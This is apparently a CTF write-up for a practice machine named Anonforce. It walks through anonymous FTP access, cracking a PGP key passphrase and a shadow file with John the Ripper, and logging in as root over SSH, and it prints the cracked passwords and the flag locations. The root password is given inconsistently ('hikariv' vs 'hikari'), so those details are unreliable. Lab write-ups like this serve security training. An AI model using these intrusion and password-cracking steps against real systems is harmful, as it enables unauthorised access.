# Anonforce | CTF Machine 

## Tools && Sources

1. metasploit
2. gpg
3. ftp
4. ssh 

## steps to get two flags 
```bash
[+] open metasploit by writing `msfconsole` in the terminal 
[+] search for ftp_version 
[+] ftp is open 
[+] search for ftp/anonymous
[+] very good ftp anonymous login allowd and I can read only .
[+] let's login and see what what we can do ftp 10.10.x.x 21 set the user to `anonymous` and enter for the password
[+] Ooooh ftp is allowed us to read the whole file system 
[+] go to /home/ you will find a user with name `melodias` so cd melodias and you will find `the user.txt` file | read it by writing command `more user.txt` | flag 1 
[+] back to / directory and  you will find a `notread` directory change directory to `/notread` and list files 
[+] download by writing `get file_name` the two files backup.pgp & private.asc  
[+] write bye to ftp session opened to close the session
[+] import private.asc file to gpg | you've to enter a password 
[+] then pgp2john private.asc > private.hash
[+] john --wordlist=/usr/share/wordlist/rockyou.txt private.hash | password is `xbox360`
[+] import the private.asc again | gpg --import private.asc | enter the password `xbox360` 
[+] gpg --decrypt backup.pgp > shadow 
[+] OMG it's a unshadow file | decrpt it using john | john --wordlist=/usr/share/wordlist/rockyou.txt shadow
[+] we've got the root password | password is `hikariv`
[+] using metasploit again search for ssh_version | Oooh ssh is open 
[+] ssh root@10.10.x.x | password is `hikariv`
```
## STEP-1
```bash
msfconsole
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_22_19-Window.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_23_01-Window.png">

## STEP-2
```bash
login with ftp | ftp 10.10.x.x 21 
enter the command `dir` | you're on the / directory 
so change your current directory to /home/ and list users | you'll find a user called `melodias`
change direcotry to /home/melodias and list files there's a `user.txt` file exist read the file by writing `more user.txt` | flag 1 
change directory to / again and list directory and you will find a `notread` directory look suspecious change your directory to /notread 
display files in that folder | ls -lha | Oooh two important files downlod these files using `mget *` command 

```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_25_08-Window.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_23_41-Window.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_27_14-Window.png">

## STEP-3
```bash
import private key `private.asc` to gpg but it's asking for a password then decrypt it first using john 
gpg2john private.asc > private.hash
john --wordlist=/usr/share/wordlists/rockyou.txt private.hash | password is `xbox360`
gpg --import private.asc | enter the passowrd `xbox360`
gpg --decrypt backup.gpg > shadow 
john --wordlist=/usr/share/wordlists/rockyou.txt shadow | password of root user is `hikari`
connect by ssh | ssh root@10.10.x.x | password is `hikari`
cd /root
cat /root.txt | flag 2
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_41_44-Window.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_41_25-Window.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/Anonforce/imgs/2022-07-19%2015_41_05-Window.png">


